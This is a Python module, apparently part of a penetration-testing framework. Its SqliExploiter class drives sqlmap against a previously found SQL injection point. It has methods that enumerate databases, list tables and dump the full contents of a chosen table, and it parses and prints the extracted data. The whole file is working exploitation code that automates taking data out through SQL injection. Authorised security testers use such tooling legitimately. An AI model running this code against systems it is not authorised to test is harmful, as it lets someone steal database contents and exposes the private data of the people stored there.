import subprocess
from utils.reporter import Reporter
import re

class SqliExploiter:
    def __init__(self, finding: dict, reporter: Reporter):
        self.url = finding['url']
        self.param = finding['parameter']
        self.method = finding['method']
        self.reporter = reporter

    def _run_sqlmap(self, sqlmap_args):
        try:
            command = ['sqlmap', '-u', self.url, '-p', self.param]

            #add POST if necessary
            if self.method == 'POST':
                command.extend(['--data', f"{self.param}=1"])

            command.extend(sqlmap_args)
            command.append('--batch')

            print(f"\n[*] Executing: {' '.join(command)}")
            process = subprocess.run(command, capture_output=True, text=True, check=True)

            #log the full output
            self.reporter.log_raw('sqli_exploiter', {'args': sqlmap_args, 'output': process.stdout})
            return process.stdout
        except FileNotFoundError:
            print("\n Critical error: SQLI Exploiter was not found. Make sure sqlmap is installed")
            return None
        except subprocess.CalledProcessError as e:
            print(f"\n Execution error: {e}")
            print(f"    Output: {e.stdout}")
            return None

    def list_dbs(self):
        """Uses sqlmap to list all available database names"""
        print("[*] Attempting to list databases...")
        output = self._run_sqlmap(["--dbs"])
        if output:
            dbs = []
            for line in output.splitlines():
                if line.strip().startswith('[*]'):
                    #Extract the name, removing the prefix and extra whitespace
                    db_name = line.strip().replace('[*]', '').strip()
                    if db_name and not db_name.startswith('ending') and not db_name.startswith('starting'):
                        dbs.append(db_name)

            print("\n  [+] Found Databases:")
            for db in dbs:
                print(f"    - {db}")
            return dbs
        return None

    def list_tables(self, db_name):
        """Uses sqlmap to list tables in a specific database"""
        print(f"[*] Attempting to list tables for database '{db_name}'...")
        output = self._run_sqlmap(["-D", db_name, "--tables"])
        if output:
            tables = []
            #Find the section containing the tables, marked by +---...---+
            table_regex = re.compile(r'^\s*\|\s*(\w+)\s*\|$')
            for line in output.splitlines():
                match = table_regex.match(line)
                if match:
                    tables.append(match.group(1))

            print(f"\n  [+] Found Tables in '{db_name}':")
            for table in tables:
                print(f"    - {table}")
            return tables
        return None

    def dump_table(self, db_name, table_name):
        """Uses sqlmap to dump all data from a specific table"""
        print(f"[*] Attempting to dump data from table '{table_name}'...")
        output = self._run_sqlmap(["-D", db_name, "-T", table_name, "--dump"])
        if output:
            print(f"\n--- Dump of {db_name}.{table_name} ---\n")

            try:
                #Finding the index of the first line that starts with a table border '+'
                start_index = next(i for i, line in enumerate(output.splitlines()) if line.strip().startswith('+--'))
                #Print everything from that line onwards
                dump_content = "\n".join(output.splitlines()[start_index:])
                print(dump_content)
            except StopIteration:
                print("[!] Could not find table data in output. Sqlmap might not have found any entries.")

            print("\n--- End of Dump ---")
            return output
        return None
